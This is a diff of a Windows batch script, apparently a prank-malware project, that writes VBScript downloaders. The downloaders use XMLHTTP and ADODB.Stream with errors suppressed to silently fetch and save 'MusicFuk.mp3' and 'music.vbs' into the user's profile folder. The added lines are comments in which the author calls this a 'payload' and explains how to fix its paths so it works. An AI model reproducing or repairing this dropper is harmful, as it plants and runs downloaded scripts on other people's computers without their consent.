@@ -67,6 +67,9 @@ echo   .open >> download1.vbs
 echo   .write xHttp.responseBody >> download1.vbs
 echo   .savetofile "%UserProfile%\MusicFuk.mp3", 2 '//overwrite >> download1.vbs
 echo end with >> download1.vbs
+rem
+rem This payload is gonna not working:
+rem
 echo on error resume next >> download2.vbs
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download2.vbs
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download2.vbs
@@ -78,6 +81,11 @@ echo   .open >> download2.vbs
 echo   .write xHttp.responseBody >> download2.vbs
 echo   .savetofile "%UserProfile%\music.vbs", 2 '//overwrite >> download2.vbs
 echo end with >> download2.vbs
+rem
+rem Because the music.vbs plays musicfuk.mp3 in happypong folder, not username folder. You must edit the musicfuk.mp3
+rem location to c:\windows\happypong. if you dont want to, then you must fork the musicvbs repo on my profile.
+rem hope that works!
+rem
 echo on error resume next >> download3.vbs
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download3.vbs
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download3.vbs
